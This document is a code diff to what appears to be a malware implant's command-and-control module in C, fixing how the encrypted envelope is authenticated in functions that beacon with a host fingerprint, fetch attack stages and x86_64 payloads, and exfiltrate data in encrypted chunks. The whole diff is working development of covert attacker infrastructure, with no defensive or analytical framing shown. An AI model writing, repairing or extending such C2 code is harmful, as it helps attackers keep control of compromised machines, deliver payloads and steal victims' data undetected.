@@ -677,21 +677,23 @@ aegis_result_t aegis_c2_beacon(aegis_c2_ctx_t *ctx, uint8_t *task_out,
   env.msg_type = C2_MSG_BEACON;
   env.sequence = ctx->sequence++;
   memcpy(env.node_id, ctx->node_id, sizeof(env.node_id));
+  env.payload_len = (uint32_t)fp_len;
 
   /* Encrypt the fingerprint payload */
   uint8_t ct_buf[1024];
   if (fp_len > sizeof(ct_buf))
     return AEGIS_ERR_GENERIC;
 
+  aegis_c2_envelope_t enc_aad_env;
+  memcpy(&enc_aad_env, &env, sizeof(env));
+
   aegis_result_t rc =
-      aegis_encrypt(ctx->crypto, fp_buf, fp_len, (const uint8_t *)&env,
-                    sizeof(env), ct_buf, env.iv, env.tag);
+      aegis_encrypt(ctx->crypto, fp_buf, fp_len, (const uint8_t *)&enc_aad_env,
+                    sizeof(enc_aad_env), ct_buf, env.iv, env.tag);
   if (rc != AEGIS_OK) {
     ctx->consecutive_failures++;
     return rc;
   }
-
-  env.payload_len = (uint32_t)fp_len;
 
   /* Assemble the full message: envelope + ciphertext */
   size_t msg_len = sizeof(env) + fp_len;
@@ -842,16 +844,19 @@ aegis_result_t aegis_c2_fetch_stage(aegis_c2_ctx_t *ctx, uint8_t **stage_out,
   uint8_t fp_buf[512];
   size_t fp_len = 0;
   generate_fingerprint(fp_buf, &fp_len, sizeof(fp_buf));
+  env.payload_len = (uint32_t)fp_len;
 
   uint8_t ct_buf[1024];
+
+  aegis_c2_envelope_t enc_aad_env;
+  memcpy(&enc_aad_env, &env, sizeof(env));
+
   aegis_result_t rc =
-      aegis_encrypt(ctx->crypto, fp_buf, fp_len, (const uint8_t *)&env,
-                    sizeof(env), ct_buf, env.iv, env.tag);
+      aegis_encrypt(ctx->crypto, fp_buf, fp_len, (const uint8_t *)&enc_aad_env,
+                    sizeof(enc_aad_env), ct_buf, env.iv, env.tag);
   AEGIS_ZERO(fp_buf, sizeof(fp_buf));
   if (rc != AEGIS_OK)
     return rc;
-
-  env.payload_len = (uint32_t)fp_len;
 
   /* Assemble and send */
   size_t msg_len = sizeof(env) + fp_len;
@@ -1001,15 +1006,17 @@ aegis_result_t aegis_c2_fetch_payload(aegis_c2_ctx_t *ctx,
   /* Minimal request body */
   const char *req_body = "{\"type\":\"payload\",\"arch\":\"x86_64\"}";
   size_t req_len = strlen(req_body);
+  env.payload_len = (uint32_t)req_len;
 
   uint8_t ct_buf[256];
+  aegis_c2_envelope_t enc_aad_env;
+  memcpy(&enc_aad_env, &env, sizeof(env));
+
   aegis_result_t rc = aegis_encrypt(ctx->crypto, (const uint8_t *)req_body,
-                                    req_len, (const uint8_t *)&env, sizeof(env),
+                                    req_len, (const uint8_t *)&enc_aad_env, sizeof(enc_aad_env),
                                     ct_buf, env.iv, env.tag);
   if (rc != AEGIS_OK)
     return rc;
-
-  env.payload_len = (uint32_t)req_len;
 
   size_t msg_len = sizeof(env) + req_len;
   uint8_t *msg = malloc(msg_len);
@@ -1116,20 +1123,22 @@ aegis_result_t aegis_c2_exfiltrate(aegis_c2_ctx_t *ctx, const uint8_t *data,
     env.msg_type = C2_MSG_EXFIL;
     env.sequence = ctx->sequence++;
     memcpy(env.node_id, ctx->node_id, sizeof(env.node_id));
+    env.payload_len = (uint32_t)this_chunk;
 
     uint8_t *ct = malloc(this_chunk + EVP_MAX_BLOCK_LENGTH);
     if (!ct)
       return AEGIS_ERR_ALLOC;
 
+    aegis_c2_envelope_t enc_aad_env;
+    memcpy(&enc_aad_env, &env, sizeof(env));
+
     aegis_result_t rc =
         aegis_encrypt(ctx->crypto, data + offset, this_chunk,
-                      (const uint8_t *)&env, sizeof(env), ct, env.iv, env.tag);
+                      (const uint8_t *)&enc_aad_env, sizeof(enc_aad_env), ct, env.iv, env.tag);
     if (rc != AEGIS_OK) {
       free(ct);
       return rc;
     }
-
-    env.payload_len = (uint32_t)this_chunk;
 
     /* Build and send */
     size_t msg_len = sizeof(env) + this_chunk;
@@ -1214,17 +1223,20 @@ aegis_result_t aegis_c2_fetch_resource(aegis_c2_ctx_t *ctx,
 
   /* Encrypt the resource ID as the payload */
   size_t id_len = strlen(resource_id);
+  env.payload_len = (uint32_t)id_len;
+
   uint8_t ct_buf[256];
   if (id_len > sizeof(ct_buf))
     return AEGIS_ERR_GENERIC;
 
+  aegis_c2_envelope_t enc_aad_env;
+  memcpy(&enc_aad_env, &env, sizeof(env));
+
   aegis_result_t rc = aegis_encrypt(ctx->crypto, (const uint8_t *)resource_id,
-                                    id_len, (const uint8_t *)&env, sizeof(env),
+                                    id_len, (const uint8_t *)&enc_aad_env, sizeof(enc_aad_env),
                                     ct_buf, env.iv, env.tag);
   if (rc != AEGIS_OK)
     return rc;
-
-  env.payload_len = (uint32_t)id_len;
 
   /* Assemble message */
   size_t msg_len = sizeof(env) + id_len;
